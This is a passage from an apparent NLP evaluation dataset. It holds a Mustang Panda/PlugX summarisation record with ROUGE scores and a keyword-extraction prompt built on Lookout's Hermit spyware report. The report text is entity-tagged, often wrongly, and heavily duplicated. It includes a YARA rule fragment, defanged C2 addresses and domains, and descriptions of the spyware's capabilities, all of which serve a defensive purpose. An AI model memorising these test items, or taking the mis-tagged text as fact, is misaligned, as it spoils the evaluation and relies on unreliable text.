uint16(0 ) = = [CARDINAL] 0x5A4D and filesize < 10 MB and any of them } [ORG] MITRE [ORG] ATT&CKT1583.001 [ORG] Acquire Infrastructure : DomainsT1027 Obfuscated [PERSON] Files or InformationT1036.005 Masquerading : [PERSON] Match [PERSON] Legitimate [PERSON] Name or LocationT1574.002 Hijack Execution Flow : [ORG] DLL Side - LoadingD3FENDD3 - FA ( File Analysis)D3 - LFP ( Local File Permissions)D3 - DA ( Dynamic Analysis)D3 - EFA ( [WORK_OF_ART] Emulated [WORK_OF_ART] File Analysis)D3 - EAL ( Executable Allowlisting)D3 - SCA ( System Call Analysis)6/6", "generated_text": "PDF; a campaign; advanced persistent threat; APT; Mustang Panda; HoneyMyte; Bronze President; Red Delta; Southeast Asian state; Myanmar news outlets; phishing emails; malicious document attachments; initial infection vector; malicious documents; payloads; Cobalt Strike; Poison Ivy; PlugX malware; Threat actors; a foothold; a target organization; a foothold; HP; printers; a legitimate utility; a DLL loader; a DAT file; PlugX execution chain; DAT files; the RAR archives; legitimate utilities; Hewlett-Packard; printers; a DAT file; a naming convention; legitimate utilities; Hewlett-Packard Printers; the C2 domains; the malware; a subdomain; the Myanmar news website; the RAR files; the group; detection; BMP; the malware; language; attribution; technical details; this campaign; the threat.", "ref_text": "<START-1>The BlackBerry Research & Intelligence Team uncovered a campaign by the China-based advanced persistent threat (APT) group Mustang Panda targeting Myanmar using the PlugX malware family. Mustang Panda typically sends phishing emails with malicious document attachments as an initial infection vector. Once threat actors gain a foothold within a target organization, they typically deploy payloads such as Cobalt Strike or PlugX. The PlugX malware is used by Mustang Panda to deliver the implant in the form of an encrypted data blob, which is typically paired with a DLL loader and a benign application. In this case, the researchers found PlugX payloads bundled with legitimate signed HP utilities in RAR files communicating with domains masquerading as Myanmar news outlets. The executables side-load malicious DLLs which decrypt and deploy the PlugX payload. This aligns with Mustang Panda's typical tactics of using legitimate apps to stealthily deploy PlugX. The researchers found evidence of related activity back to late 2020. Given the targeting of Myanmar entities, use of PlugX, and impersonation of local news, the campaign fits Mustang Panda's modus operandi. Defenders can use the provided indicators of compromise and mitigation techniques to detect this threat. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4733727810650888, "gpt3/lexical/rouge_rouge2": 0.16666666666666666, "gpt3/lexical/rouge_rougeL": 0.26627218934911245, "gpt3/lexical/rouge_rougeLsum": 0.26627218934911245, "gpt3_generated_text": ["The article discusses a recent campaign by an advanced persistent threat (APT) group called Mustang Panda, which is targeting victims in Myanmar. The APT group is using the PlugX malware family and abusing legitimate apps to carry out their attacks. The article provides detailed information about Mustang Panda, their attack vectors, and their history of targeting various organizations and countries. The article also describes the specific tactics and techniques used by the APT group in this campaign, including phishing emails, malicious document attachments, and the use of legitimate utilities and DLL loaders. The article concludes by attributing the campaign to Mustang Panda with reasonable confidence based on the group's previous activities and the evidence found in the samples analyzed. Overall, the article provides technical details and insights into the APT group's methods and highlights the ongoing threat posed by Mustang Panda."]}, {"split_name": "val", "sample_id": "val_26", "prompt_text": "Extract the keywords: www.lookout.com /blog / hermit - spyware - discovery Lookout Uncovers Android Spyware Deployed in [PRODUCT] KazakhstanLookout [PRODUCT] Threat Lab researchers have uncovered enterprise - grade [ORG] Android surveillanceware used by the government of [GPE] Kazakhstan within its borders . While we \u2019ve been following this threat for a while using [ORG] Lookout [ORG] Endpoint [ORG] Detection and [ORG] Response ( [ORG] EDR ) these latest samples were detected in [DATE] April [DATE] 2022 , [DATE] four [DATE] months after nation - wide protests against government policies were violently suppressed . Based on our analysis , the spyware , which we named \u201c [ORG] Hermit , \u201d is likely developed by [NORP] Italian spyware vendor [ORG] RCS [ORG] Lab [ORG] S.p . A and [ORG] Tykelab [ORG] Srl , a telecommunications solutions company we suspect to be operating as a front company . This is n't the [ORDINAL] first time [ORG] Hermit has been deployed . We know that the [NORP] Italian authorities used it in an anti - corruption operation in [DATE] 2019 . We also found evidence suggesting that an unknown actor used it in northeastern [GPE] Syria , a predominantly [NORP] Kurdish region that has been the setting of numerous regional conflicts . While some [ORG] Hermit samples have been detected before and are broadly recognized as generic spyware , the connections we make in this blog to developers , campaigns and operators are new . [PERSON] RCS [PERSON] Lab , a known developer that has been active for over [DATE] three [DATE] decades , operates in the same market as Pegasus developer [ORG] NSO [ORG] Group [ORG] Technologies and [ORG] Gamma [ORG] Group , which created [PERSON] FinFisher . Collectively branded as \u201c lawful intercept \u201d companies , they claim to only sell to customers with legitimate use for surveillanceware , such as intelligence and law enforcement agencies . In reality , such tools have often been abused under the guise of national security to spy on business executives , human rights activists , journalists , academics and government officials . What is [PERSON] Hermit?Named after a distinct server path used by the attacker \u2019s command and control ( C2 ) , [ORG] Hermit is a modular surveillanceware that hides its malicious capabilities in packages downloaded after it \u2019s deployed . We obtained and analyzed [CARDINAL] 16 of the [QUANTITY] 25 [QUANTITY] known [QUANTITY] modules , each with unique capabilities . These modules , along with the permissions the core apps have , enable [ORG] Hermit to exploit a rooted device , record audio and make and redirect phone calls , as well as collect data such as call logs , contacts , photos , device location and SMS messages . We theorize that the spyware is distributed via SMS messages pretending to come from a legitimate source . The malware samples analyzed impersonated the applications of telecommunications companies or smartphone manufacturers . Hermit tricks users by serving up the legitimate webpages of the brands it impersonates as it kickstarts malicious activities in the background . We\u2019re aware of an iOS version of [ORG] Hermit but were unable to obtain a sample for analysis . [GPE] Kazakhstan deploymentOur analysis suggests that [ORG] Hermit has not only been deployed to [GPE] Kazakhstan , but that an entity of the national government is likely behind the campaign . To our knowledge , this marks the [ORDINAL] first time that a current customer of [ORG] RCS [ORG] Lab \u2019s mobile malware has been identified.1/17We [ORDINAL] first detected samples from this campaign in [DATE] April [DATE] 2022 . They were titled \u201c oppo.service \u201d and impersonated [NORP] Chinese electronic manufacturer [GPE] Oppo . The website the malware used to mask its malicious activity is an official Oppo support page ( url in the Kazakh language that has since gone offline . We also found samples that impersonate [ORG] Samsung and Vivo . The now defunct [PERSON] Kazkhak language Oppo support page is loaded and displayed to users as malicious activities happen in the background . The samples used in the [ORG] Kazakh targeted campaign connected to the [CARDINAL] C2 address at [CARDINAL] 45.148.30[.]122:58442 . However , further analysis of the spyware \u2019s C2 server revealed that this [ORG] IP address is used as a proxy for the real C2 server at [DATE] 85.159.27[.]61:8442 . The real C2 IP address is administered by [ORG] STS [ORG] Telecom , a small internet service provider ( [ORG] ISP ) operating out of Nur - Sultan , [GPE] Kazakhstan \u2019s capital . Based on sparse online records , [ORG] STS specializes in \u201c other wired telecommunications \u201d and cable [CARDINAL] services.2/17Our interaction with a poorly configured [CARDINAL] C2 server revealed the true C2 IP address . [GPE] Syria , [GPE] Italy and other targetsPrior to detecting the [GPE] Kazakhstan samples , we found a reference to \u201c [PERSON] Rojava , \u201d a [NORP] Kurdish - speaking region in northeastern [GPE] Syria , in the passive [ORG] DNS records of [ORG] Hermit . This is significant because the region has been the site of ongoing crises , such as [EVENT] the [EVENT] Syrian [EVENT] civil [EVENT] war and conflicts between [ORG] the [ORG] Islamic [ORG] State ( IS ) and U.S.-led coalition support of the [NORP] Kurdish - led [ORG] Syrian [ORG] Democratic [ORG] Forces ( SDF ) . Most recently , [GPE] Turkey conducted a series of military operations against the [ORG] SDF that resulted in partial occupation of the region . The domain we found ( rojavanetwork[.]info ) specifically imitates \u201c [PERSON] Rojava [PERSON] Network , \u201d a social media brand on Facebook and Twitter that provides news coverage and political analysis of the region , often in support of [ORG] SDF operations.3/17The domain rojavanetwork[.]info seems to be specifically imitating \u201c [PERSON] Rojava [PERSON] Network , \u201d a social media brand on Facebook and [PRODUCT] Twitter tha analysis of the region , often in support of [ORG] SDF operations . Outside [GPE] Syria , [ORG] Hermit has been deployed in [GPE] Italy . According to a document released by the [NORP] Italian lower house in [DATE] 2021 , [NORP] Italian authorities potentially misused it in an anti - corruption operation . The document mentioned an [NORP] iOS version of [ORG] Hermit and linked [PERSON] RCS [PERSON] Lab and [GPE] Tykelab to the malware , which corroborates our analysis . [PERSON] RCS [PERSON] Lab and its controversial connectionsLike many spyware vendors , not much is known about [PERSON] RCS [PERSON] Lab and its clientele . But based on the information we do have , it has a considerable international presence . According to leaked documents published in WikiLeaks in [DATE] 2015 , [PERSON] RCS [PERSON] Lab was a reseller for another [NORP] Italian spyware vendor [ORG] HackingTeam , now known as [PERSON] Memento [PERSON] Labs , [DATE] as [DATE] early [DATE] as [DATE] 2012 . Correspondences between the [CARDINAL] two companies revealed that [PERSON] RCS [PERSON] Lab engaged with military and intelligence agencies in [GPE] Pakistan , [GPE] Chile , [GPE] Mongolia , [GPE] Bangladesh , [GPE] Vietnam , [GPE] Myanmar and [GPE] Turkmenistan \u2014 the latter three ranked as authoritarian regimes by the Democracy Index . [PERSON] RCS [PERSON] Lab also has past dealings with [GPE] Syria , another authoritarian regime , as part of its collaboration with [GPE] Berlin - based [ORG] Advanced [ORG] German [ORG] Technology ( [ORG] AGT ) to sell surveillance solutions.4/17Countries that had ties to [ORG] RCS [ORG] Lab \u2019s past business connections . Top row : [GPE] Chile , [GPE] Pakistan , [GPE] Mongolia and [GPE] Bangladesh ; bottom row : [ORG] MyaTykelab and its connection to [PERSON] RCS [PERSON] LabAccording to its own website , [GPE] Tykelab provides innocuous technology solutions . However , we found various publicly- available clues that suggest otherwise . In addition to the [NORP] Italian parliamentary document , we found several pieces of evidence tying [GPE] Tykelab to [PERSON] RCS [PERSON] Lab . For example , a current [GPE] Tykelab employee \u2019s [NORP] LinkedIn profile indicates that they also work at RCS Lab . In addition , the company offers services that require skills that may be useful in the development and delivery of surveillanceware , such as knowledge or interaction with telecommunications networks , social media analysis , [ORG] SMS services and mobile app development . [CARDINAL] One of the [GPE] Tykelab job postings for a security engineer we found spells out desired skills that would have direct application to surveillance of mobile networks and devices.5/17This [GPE] Tykelab job listing highlights interest in mobile network vulnerabilities , penetration testing , and reverse engineering : skills that canIn our own analysis of [ORG] Hermit , we were able to tie [GPE] Tykelab to [ORG] Hermit and [PERSON] RCS [PERSON] Lab . [CARDINAL] One of the [ORG] IP addresses [ORG] Hermit used for [CARDINAL] C2 communications revealed an [ORG] SSL certificate shared with another [ORG] IP , [CARDINAL] 93.51.226[.]53 . Notably , the shared certificate has [GPE] Milan , [GPE] Italy in the locality field which is where [PERSON] RCS [PERSON] Lab is headquartered . This [ORDINAL] second [ORG] IP used another [ORG] SSL certificate that directly named [ORG] RCS as the organization and [GPE] Tykelab as the organization unit . The location references [GPE] Rome , which is the headquarters location of Tykelab6/17An SSL certificate tied to [ORG] Hermit infrastructure shows that [GPE] Tykelab and [PERSON] RCS [PERSON] Lab are both connected to the spyware . Technical analysis : [ORG] Hermit \u2019s advanced capabilitiesHermit is a highly configurable surveillanceware with enterprise - grade capabilities to collect and transmit data . For example , it uses 20 - plus parameters , which enables any operator to tailor it to their campaign . The spyware also attempts to maintain data integrity of collected \u2018 evidence \u2019 by sending a hash - based message authentication code ( [ORG] HMAC ) . This allows the actors to authenticate who sent the data as well as ensure the data is unchanged . Using this method for data transmission may enable the admissibility of collected evidence . To cover up its true intentions , [ORG] Hermit is built to be modular . This means malicious functionality is hidden inside additional payloads that the malware downloads as needed . How it tricks victims and avoids detectionAs we mentioned earlier , [ORG] Hermit pretends to come from legitimate entities , namely telecommunications companies or smartphone manufacturers . To keep up this facade , the malware loads and displays the website from the impersonated company simultaneously as malicious activities kickstart in the background . The [ORDINAL] first malicious step is to decrypt an embedded configuration file with properties that are used to communicate with the C2 server . But before communication happens , [ORG] Hermit performs a series of checks to ensure that it is n\u2019t being analyzed . This includes looking for the presence of an emulator and signs that the app itself has been modified to make analysis easier . [PERSON] Modules and data collectionOnce the malware connects with the C2 , it takes instructions on what modules to download , each with distinct capabilities . In addition to the modules , the permissions that the malware requests indicate the various ways it could collect data . Hermit can be asked by the C2 to download modules from any URL and then load them dynamically . In total we acquired [QUANTITY] 16 [QUANTITY] modules by interacting with the [ORG] IP address ( [CARDINAL] 45.148.30[.]122:58442 ) \u201c oppo.service \u201d used for [CARDINAL] C2 communications . Based on identification numbers assigned to the modules in [ORG] Hermit \u2019s code , there are [CARDINAL] at [CARDINAL] least [CARDINAL] 25 modules.7/17Within the core app , we found an abstract class called \u201c module \u201d that provided additional hints as to what the rest of the modules are capable of . The code contained references to exploit usage , which was further confirmed by clues found in obtained modules . While we were n\u2019t served exploits during testing , we can tell that an exploited device will modules that can use exploits . If the device is confirmed to be exploitable then it will communicate with the C2 to acquire the files necessary to exploit the device and start its root service . This service will then be used to enable elevated device privileges such as access to accessibility services , notification content , package use state and the ability to ignore battery optimization . Beyond the root service , some of the modules expect or attempt to use root access directly through a su binary . These modules will attempt to modify the shared preferences of the SuperSU app in order to enable the execution of root commands without user interaction . While this may be a generic attempt at using root without user awareness , SuperSU may also be a part of the unknown exploitation process . If root is not available , the modules may prompt the user to take actions which will accomplish the same goals . These are the modules we were able to acquire ( refer to the appendix for a complete breakdown of each modules):Accessibility Event Screen CaptureAddress Book [PRODUCT] TelegramLike other weaponry , spyware can easily be abusedVendors of so - called \u201c lawful intercept \u201d spyware , such as [PERSON] RCS [PERSON] Lab , [ORG] the [ORG] NSO [ORG] Group and [ORG] Gamma [ORG] Group , usually claim to only sell to entities that have a legitimate use for surveillanceware such as police forces fighting organized crime or terrorism . However , there have been many reports , especially in [DATE] recent [DATE] years , of spyware being misused . We found evidence of [ORG] Hermit being deployed in [GPE] Kazakhstan and [GPE] Syria , countries with poor human rights records . Even in the case of the anti - corruption operations in [GPE] Italy , there was alleged mishandling of personal and private data . In a sense , electronic surveillance tools are not that different from any other type of weaponry . [DATE] Just [DATE] this [DATE] month , faced with financial pressure , CEO of the [ORG] NSO group [PERSON] Shalev [PERSON] Hulio opened up the possibility of selling to \u201c risky \u201d clients . Spyware makers operate in secrecy and with limited oversight and the legitimacy of the use of their products is rarely as clear - cut as they project . How to protect yourself from spyware like [ORG] HermitWith sophisticated data collection capabilities , and the fact that we carry them all the time , mobile devices are the perfect target for surveillance . While not all of us will be targeted by sophisticated spyware , here are some tips to keep yourself and your organization safe:8/17Update your phone and apps : operating systems and apps will often have vulnerabilities that need to be patched . Update them to ensure the exploits are resolved . Do n\u2019t click on unknown links : [CARDINAL] one of the most common ways for an attacker to deliver malware is by sending you a message pretending to be a legitimate source . Do n\u2019t click on links , especially when you do n\u2019t know the source . Do n\u2019t install unknown apps : exercise caution when installing unknown apps , even if the source of the app seems like a legitimate authority . Periodically review your apps : sometimes malware can change settings or install additional content to your phone . Check your phone periodically to ensure nothing unknown has been added . In addition to following the security best practices outlined above , we strongly recommend having a dedicated mobile security solution to ensure that your device is not compromised by malware or phishing attacks . To the best of our knowledge the apps described in this article were never distributed through Google Play . Users of Lookout security apps are protected from these threats . Indicators of [PERSON] Compromise [PERSON] Core [PERSON] App indicatorsSHA1 Port 2.229.68[.]182 8442 2.228.150[.]86 8443 93.57.84[.]78 8443 93.39.197[.]234 [DATE] 8443 45.148.30[.]122 58442 85.159.27[.]61 8442Sample of domains used in [ORG] Hermit \u2019s targeting operations119 - tim[.]info [CARDINAL] 133 - tre[.]info [CARDINAL] 146 - fastweb[.]info [CARDINAL] 155 - wind[.]info 159 - windtre[.]info iliad[.]info amex - co[.]info cloud - apple[.]info fb - techsupport[.]commilf[.]house kena - mobile[.]info poste - it[.]info rojavanetwork[.]info store - apple[.]info wind - h3g[.]infoParameter configurations [ORG] Hermit usesParameter vps p1,p3,p4,p5,p6 [ORG] Certificate fingerprint , [ORG] IP address , and port , for [CARDINAL] C2 communication Server endpoints for various [CARDINAL] C2 communications This is the benign URL opened when the application is launched Determines if the icon of the application will be hidden . String used along with [NORP] android_id as a unique device identifier Expected signature of the app . If the signature does not match the app will not run . Package name of another app interacted with on device Component name of a service contained in wdpn app HTTP header added to every request for authentication Pre - shared key used for message authentication [NORP] Boolean indicating whether [ORG] APK files should be deleted if anti- emulation checks fail [GPE] Fingerprint for protobuf encryption setup Public key for protobuf encryption setup9/17applicationId , gcmSenderId projectId , storageBucket apiKeyModules downloaded by [ORG] HermitFirebase [ORG] Messaging [ORG] Service setup parametersModule [ORG] ClipboardDevice InfoFunctionNoteTrack foreground app . [ORG] Steal stored account emails . [ORG] Steal browser bookmarks / searches . Steal calendar events , attendees . Take pictures . Steal current and future clipboard content . Exfiltrate device information , including : Applications root / exploitation statusDownload and install APK files on [ORG] the [ORG] File [ORG] Upload [ORG] Upload files from the device . [ORG] LogEnable / disable verbose logging . Exfiltrate notification content . Dismiss / snooze notifications that reference , but do n\u2019t originate from , the [ORG] Hermit app . Take pictures of the screen . [PERSON] Notification [PERSON] Telegram [PERSON] Prompt the user to reinstall [ORG] Telegram onthe device with a downloaded APK.WhatsApp Prompt the user to reinstall [PRODUCT] WhatsAppvia [PRODUCT] Play [PRODUCT] Store . Use root to silently install apps . Use root to copy files the app does n\u2019t have access to . Use root to run \u2018 screencap \u2019 Use root to silently uninstall / reinstall [ORG] Telegram . Also copy the old app \u2019s data to the new app \u2019s folder , changing the files \u2019 [ORG] SELinux contexts and ownersLookout Threat Lab researchers have uncovered enterprise - grade [ORG] Android surveillanceware used by the government of [GPE] Kazakhstan within its borders . While we \u2019ve been following this threat for a while using [ORG] Lookout [ORG] Endpoint [ORG] Detection and [ORG] Response ( [ORG] EDR ) these latest samples were detected in [DATE] April [DATE] 2022 , [DATE] four [DATE] months after nation - wide protests against government policies were violently suppressed . Based on our analysis , the spyware , which we named \u201c [ORG] Hermit , \u201d is likely developed by [NORP] Italian spyware vendor [ORG] RCS [ORG] Lab [ORG] S.p . A and [ORG] Tykelab [ORG] Srl , a telecommunications solutions company we suspect to be operating as a front company . This is n't the [ORDINAL] first time [ORG] Hermit has been deployed . We know that the [NORP] Italian authorities used it in an anti - corruption operation in [DATE] 2019 . We also found evidence suggesting that an unknown actor used it in northeastern [GPE] Syria , a predominantly [NORP] Kurdish region that has been the setting of numerous regional conflicts . While some [ORG] Hermit samples have been detected before and are broadly recognized as generic spyware , the connections we make in this blog to developers , campaigns and operators are new . [PERSON] RCS [PERSON] Lab , a known developer that has been active for over [DATE] three [DATE] decades , operates in the same market as Pegasus developer [ORG] NSO [ORG] Group [ORG] Technologies and [ORG] Gamma [ORG] Group , which created [PERSON] FinFisher . Collectively branded as \u201c lawful intercept \u201d companies , they claim to only sell to customers with legitimate use for surveillanceware , such as intelligence and law enforcement agencies . In reality , such tools have often been abused under the guise of national security to spy on business executives , human rights activists , journalists , academics and government officials . What is [PERSON] Hermit?Named after a distinct server path used by the attacker \u2019s command and control ( C2 ) , [ORG] Hermit is a modular surveillanceware that hides its malicious capabilities in packages downloaded after it \u2019s deployed . We obtained and analyzed [CARDINAL] 16 of the [QUANTITY] 25 [QUANTITY] known [QUANTITY] modules , each with unique capabilities . These modules , along with the permissions the core apps have , enable [ORG] Hermit to exploit a rooted device , record audio and make and redirect phone calls , as well as collect data such as call logs , contacts , photos , device location and SMS messages.10/17We theorize that the spyware is distributed via SMS messages pretending to come from a legitimate source . The malware samples analyzed impersonated the applications of telecommunications companies or smartphone manufacturers . Hermit tricks users by serving up the legitimate webpages of the brands it impersonates as it kickstarts malicious activities in the background . We\u2019re aware of an iOS version of [ORG] Hermit but were unable to obtain a sample for analysis . [GPE] Kazakhstan deploymentOur analysis suggests that [ORG] Hermit has not only been deployed to [GPE] Kazakhstan , but that an entity of the national government is likely behind the campaign . To our knowledge , this marks the [ORDINAL] first time that a current customer of [ORG] RCS [ORG] Lab \u2019s mobile malware has been identified . We [ORDINAL] first detected samples from this campaign in [DATE] April [DATE] 2022 . They were titled \u201c oppo.service \u201d and impersonated [NORP] Chinese electronic manufacturer [GPE] Oppo . The website the malware used to mask its malicious activity is an official Oppo support page ( url in the Kazakh language that has since gone offline . We also found samples that impersonate [ORG] Samsung and Vivo . The now defunct [PERSON] Kazkhak language Oppo support page is loaded and displayed to users as malicious activities happen in the background . The samples used in the [ORG] Kazakh targeted campaign connected to the [CARDINAL] C2 address at [CARDINAL] 45.148.30[.]122:58442 . However , further analysis of the spyware \u2019s C2 server revealed that this [ORG] IP address is used as a proxy for the real C2 server at [DATE] 85.159.27[.]61:8442 . The real C2 IP address is administered by [ORG] STS [ORG] Telecom , a small internet service provider ( [ORG] ISP ) operating out of Nur - Sultan , [GPE] Kazakhstan \u2019s capital . Based on sparse online records , [ORG] STS specializes in \u201c other wired telecommunications \u201d and cable services.11/17Our interaction with a poorly configured [CARDINAL] C2 server revealed the true C2 IP address . [GPE] Syria , [GPE] Italy and other targetsPrior to detecting the [GPE] Kazakhstan samples , we found a reference to \u201c [PERSON] Rojava , \u201d a [NORP] Kurdish - speaking region in northeastern [GPE] Syria , in the passive [ORG] DNS records of [ORG] Hermit . This is significant because the region has been the site of ongoing crises , such as [EVENT] the [EVENT] Syrian [EVENT] civil [EVENT] war and conflicts between [ORG] the [ORG] Islamic [ORG] State ( IS ) and U.S.-led coalition support of the [NORP] Kurdish - led [ORG] Syrian [ORG] Democratic [ORG] Forces ( SDF ) . Most recently , [GPE] Turkey conducted a series of military operations against the [ORG] SDF that resulted in partial occupation of the region . The domain we found ( rojavanetwork[.]info ) specifically imitates \u201c [PERSON] Rojava [PERSON] Network , \u201d a social media brand on Facebook and Twitter that provides news coverage and political analysis of the region , often in support of [ORG] SDF operations . The domain rojavanetwork[.]info seems to be specifically imitating \u201c [PERSON] Rojava [PERSON] Network , \u201d a social media brand on Facebook and [PRODUCT] Twitter tha analysis of the region , often in support of [ORG] SDF operations . Outside [GPE] Syria , [ORG] Hermit has been deployed in [GPE] Italy . According to a document released by the [NORP] Italian lower house in [DATE] 2021 , [NORP] Italian authorities potentially misused it in an anti - corruption operation . The document mentioned an [NORP] iOS version of [ORG] Hermit and linked [PERSON] RCS [PERSON] Lab and [GPE] Tykelab to the malware , which corroborates our analysis . [PERSON] RCS [PERSON] Lab and its controversial connections12/17Like many spyware vendors , not much is known about [PERSON] RCS [PERSON] Lab and its clientele . But based on the information we do have , it has a considerable international presence . According to leaked documents published in WikiLeaks in [DATE] 2015 , [PERSON] RCS [PERSON] Lab was a reseller for another [NORP] Italian spyware vendor [ORG] HackingTeam , now known as [PERSON] Memento [PERSON] Labs , [DATE] as [DATE] early [DATE] as [DATE] 2012 . Correspondences between the [CARDINAL] two companies revealed that [PERSON] RCS [PERSON] Lab engaged with military and intelligence agencies in [GPE] Pakistan , [GPE] Chile , [GPE] Mongolia , [GPE] Bangladesh , [GPE] Vietnam , [GPE] Myanmar and [GPE] Turkmenistan \u2014 the latter three ranked as authoritarian regimes by the Democracy Index . [PERSON] RCS [PERSON] Lab also has past dealings with [GPE] Syria , another authoritarian regime , as part of its collaboration with [GPE] Berlin - based [ORG] Advanced [ORG] German [ORG] Technology ( [ORG] AGT ) to sell surveillance solutions . Countries that had ties to [ORG] RCS [ORG] Lab \u2019s past business connections . Top row : [GPE] Chile , [GPE] Pakistan , [GPE] Mongolia and [GPE] Bangladesh ; bottom row : [ORG] MyaTykelab and its connection to [PERSON] RCS [PERSON] LabAccording to its own website , [GPE] Tykelab provides innocuous technology solutions . However , we found various publicly- available clues that suggest otherwise . In addition to the [NORP] Italian parliamentary document , we found several pieces of evidence tying [GPE] Tykelab to [PERSON] RCS [PERSON] Lab . For example , a current [GPE] Tykelab employee \u2019s [NORP] LinkedIn profile indicates that they also work at RCS Lab . In addition , the company offers services that require skills that may be useful in the development and delivery of surveillanceware , such as knowledge or interaction with telecommunications networks , social media analysis , [ORG] SMS services and mobile app development . [CARDINAL] One of the [GPE] Tykelab job postings for a security engineer we found spells out desired skills that would have direct application to surveillance of mobile networks and devices . This [GPE] Tykelab job listing highlights interest in mobile network vulnerabilities , penetration testing , and reverse engineering : skills that canIn our own analysis of [ORG] Hermit , we were able to tie [GPE] Tykelab to [ORG] Hermit and [PERSON] RCS [PERSON] Lab . [CARDINAL] One of the [ORG] IP addresses [ORG] Hermit used for [CARDINAL] C2 communications revealed an [ORG] SSL certificate shared with another [ORG] IP , [CARDINAL] 93.51.226[.]53 . Notably , the shared certificate has [GPE] Milan , [GPE] Italy in the locality field which is where [PERSON] RCS [PERSON] Lab is headquartered . This [ORDINAL] second [ORG] IP used another [ORG] SSL certificate that directly named [ORG] RCS as the organization and [GPE] Tykelab as the organization unit . The location references [GPE] Rome , which is the headquarters location of Tykelab13/17An SSL certificate tied to [ORG] Hermit infrastructure shows that [GPE] Tykelab and [PERSON] RCS [PERSON] Lab are both connected to the spyware . Technical analysis : [ORG] Hermit \u2019s advanced capabilitiesHermit is a highly configurable surveillanceware with enterprise - grade capabilities to collect and transmit data . For example , it uses 20 - plus parameters , which enables any operator to tailor it to their campaign . The spyware also attempts to maintain data integrity of collected \u2018 evidence \u2019 by sending a hash - based message authentication code ( [ORG] HMAC ) . This allows the actors to authenticate who sent the data as well as ensure the data is unchanged . Using this method for data transmission may enable the admissibility of collected evidence . To cover up its true intentions , [ORG] Hermit is built to be modular . This means malicious functionality is hidden inside additional payloads that the malware downloads as needed . How it tricks victims and avoids detectionAs we mentioned earlier , [ORG] Hermit pretends to come from legitimate entities , namely telecommunications companies or smartphone manufacturers . To keep up this facade , the malware loads and displays the website from the impersonated company simultaneously as malicious activities kickstart in the background . The [ORDINAL] first malicious step is to decrypt an embedded configuration file with properties that are used to communicate with the C2 server . But before communication happens , [ORG] Hermit performs a series of checks to ensure that it is n\u2019t being analyzed . This includes looking for the presence of an emulator and signs that the app itself has been modified to make analysis easier . [PERSON] Modules and data collectionOnce the malware connects with the C2 , it takes instructions on what modules to download , each with distinct capabilities . In addition to the modules , the permissions that the malware requests indicate the various ways it could collect data . Hermit can be asked by the C2 to download modules from any URL and then load them dynamically . In total we acquired [QUANTITY] 16 [QUANTITY] modules by interacting with the [ORG] IP address ( [CARDINAL] 45.148.30[.]122:58442 ) \u201c oppo.service \u201d used for [CARDINAL] C2 communications . Based on identification numbers assigned to the modules in [ORG] Hermit \u2019s code , there are at least 25 modules.14/17Within the core app , we found an abstract class called \u201c module \u201d that provided additional hints as to what the rest of the modules are capable of . The code contained references to exploit usage , which was further confirmed by clues found in obtained modules . While we were n\u2019t served exploits during testing , we can tell that an exploited device will modules that can use exploits . If the device is confirmed to be exploitable then it will communicate with the C2 to acquire the files necessary to exploit the device and start its root service . This service will then be used to enable elevated device privileges such as access to accessibility services , notification content , package use state and the ability to ignore battery optimization . Beyond the root service , some of the modules expect or attempt to use root access directly through a su binary . These modules will attempt to modify the shared preferences of the SuperSU app in order to enable the execution of root commands without user interaction . While this may be a generic attempt at using root without user awareness , SuperSU may also be a part of the unknown exploitation process . If root is not available , the modules may prompt the user to take actions which will accomplish the same goals . These are the modules we were able to acquire ( refer to the appendix for a complete breakdown of each modules):Accessibility Event Screen CaptureAddress Book [PRODUCT] TelegramLike other weaponry , spyware can easily be abusedVendors of so - called \u201c lawful intercept \u201d spyware , such as [PERSON] RCS [PERSON] Lab , [ORG] the [ORG] NSO [ORG] Group and [ORG] Gamma [ORG] Group , usually claim to only sell to entities that have a legitimate use for surveillanceware such as police forces fighting organized crime or terrorism . However , there have been many reports , especially in [DATE] recent [DATE] years , of spyware being misused . We found evidence of [ORG] Hermit being deployed in [GPE] Kazakhstan and [GPE] Syria , countries with poor human rights records . Even in the case of the anti - corruption operations in [GPE] Italy , there was alleged mishandling of personal and private data . In a sense , electronic surveillance tools are not that different from any other type of weaponry . [DATE] Just [DATE] this [DATE] month , faced with financial pressure , CEO of the [ORG] NSO group [PERSON] Shalev [PERSON] Hulio opened up the possibility of selling to \u201c risky \u201d clients . Spyware makers operate in secrecy and with limited oversight and the legitimacy of the use of their products is rarely as clear - cut as they project . How to protect yourself from spyware like [ORG] HermitWith sophisticated data collection capabilities , and the fact that we carry them all the time , mobile devices are the perfect target for surveillance . While not all of us will be targeted by sophisticated spyware , here are some tips to keep yourself and your organization safe:15/17Update your phone and apps : operating systems and apps will often have vulnerabilities that need to be patched . Update them to ensure the exploits are resolved . Do n\u2019t click on unknown links : [CARDINAL] one of the most common ways for an attacker to deliver malware is by sending you a message pretending to be a legitimate source . Do n\u2019t click on links , especially when you do n\u2019t know the source . Do n\u2019t install unknown apps : exercise caution when installing unknown apps , even if the source of the app seems like a legitimate authority . Periodically review your apps : sometimes malware can change settings or install additional content to your phone . Check your phone periodically to ensure nothing unknown has been added . In addition to following the security best practices outlined above , we strongly recommend having a dedicated mobile security solution to ensure that your device is not compromised by malware or phishing attacks . To the best of our knowledge the apps described in this article were never distributed through Google Play . Users of Lookout security apps are protected from these threats . Indicators of [PERSON] Compromise [PERSON] Core [PERSON] App indicatorsSHA1 Port 2.229.68[.]182 8442 2.228.150[.]86 8443 93.57.84[.]78 8443 93.39.197[.]234 [DATE] 8443 45.148.30[.]122 58442 85.159.27[.]61 8442Sample of domains used in [ORG] Hermit \u2019s targeting operations119 - tim[.]info [CARDINAL] 133 - tre[.]info [CARDINAL] 146 - fastweb[.]info [CARDINAL] 155 - wind[.]info 159 - windtre[.]info iliad[.]info amex - co[.]info cloud - apple[.]info fb - techsupport[.]commilf[.]house kena - mobile[.]info poste - it[.]info rojavanetwork[.]info store - apple[.]info wind - h3g[.]infoParameter configurations [ORG] Hermit usesParameter vps p1,p3,p4,p5,p6 [ORG] Certificate fingerprint , [ORG] IP address , and port , for [CARDINAL] C2 communication Server endpoints for various [CARDINAL] C2 communications This is the benign URL opened when the application is launched Determines if the icon of the application will be hidden . String used along with [NORP] android_id as a unique device identifier Expected signature of the app . If the signature does not match the app will not run . Package name of another app interacted with on device Component name of a service contained in wdpn app HTTP header added to every request for authentication Pre - shared key used for message authentication [NORP] Boolean indicating whether [ORG] APK files should be deleted if anti- emulation checks fail [GPE] Fingerprint for protobuf encryption setup Public key for protobuf encryption [ORG] setup16/17applicationId , 